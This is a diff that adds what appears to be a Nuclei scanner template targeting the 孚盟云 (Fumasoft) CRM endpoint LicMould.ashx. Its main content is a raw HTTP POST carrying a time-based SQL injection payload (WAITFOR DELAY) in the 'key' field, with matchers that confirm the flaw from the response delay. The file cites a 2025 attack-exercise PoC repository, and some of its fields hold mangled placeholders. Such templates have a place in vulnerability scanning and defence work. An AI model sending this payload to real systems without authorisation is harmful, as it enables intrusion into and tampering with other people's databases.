@@ -1,0 +1,36 @@
+id: fumasoft-LicMould-sqli
+info:
+  name: 孚盟云CRM LicMould.ashx SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - dhttps://github.com/crushforyou/2025hvv-poc/blob/a09c3778c7df907941342afba5c18f08cd515d9c/%E5%AD%9A%E7%9B%9F%E4%BA%91/%E5%AD%9A%E7%9B%9F%E4%BA%91CRM%20LicMould.ashx%20SQL%E6%B3%A8%E5%85%A5.txt#L3emo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: fumasoft,sqli
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /Ajax/LicMould.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 123
+
+        action=DeleteEmp&key=1%20WAITFOR%20DELAY%20'0:0:5'--%20&fuids=abc,def,
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
